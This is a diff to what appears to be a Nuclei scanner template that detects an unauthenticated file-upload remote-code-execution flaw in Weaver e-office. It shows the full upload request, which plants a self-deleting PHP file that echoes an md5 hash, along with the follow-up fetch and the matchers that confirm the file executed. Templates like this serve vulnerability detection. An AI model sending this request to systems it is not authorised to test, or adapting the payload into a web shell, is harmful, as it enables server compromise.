@@ -14,7 +14,7 @@ info:
   tags: weaver,e-office,intrusive,rce,file-upload
 variables:
   filename: "{{to_lower(rand_base(5))}}"
-  string: "{{randstr}}"
+  string: "weaver-lazyuploadify-file-upload"
 
 http:
   - raw:
@@ -33,7 +33,7 @@ http:
         Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
         Content-Type: application/octet-stream
 
-        <?php echo "{{string}}";unlink(__FILE__);?>
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
         ------WebKitFormBoundaryjetvpuye--
       - |
         GET /attachment/{{attachmentID}}/{{attachmentName}} HTTP/1.1
@@ -58,8 +58,11 @@ http:
     matchers:
       - type: dsl
         dsl:
-          - "status_code_1 == 200"
           - "contains(body_2, 'attachmentID') && contains(body_2, 'attachmentName')"
-          - "status_code_3 == 200 && contains(body_3,'{{randstr}}')"
         condition: and
-# digest: 4b0a00483046022100b1ecbee09f268b25db456fc80be7fb4e0436700a30c52c333959bad8e6396eaa022100ecdc3c2a0b7b463361a617fa59de8766cc175aa00c02f53aab647db22bf0b837:922c64590222798bb761d5b6d8e72950
+
+      - type: word
+        part: body_3
+        words:
+          - '{{md5(string)}}'
+# digest: 4b0a00483046022100999368c1dee07ce22034f050ef16b88a953b896d1bd9b7fab67855790083e362022100ba0c420cc3d1be703b26c34f2f711cc8d87a27a916da2b5cb5e22e2adbff099f:922c64590222798bb761d5b6d8e72950
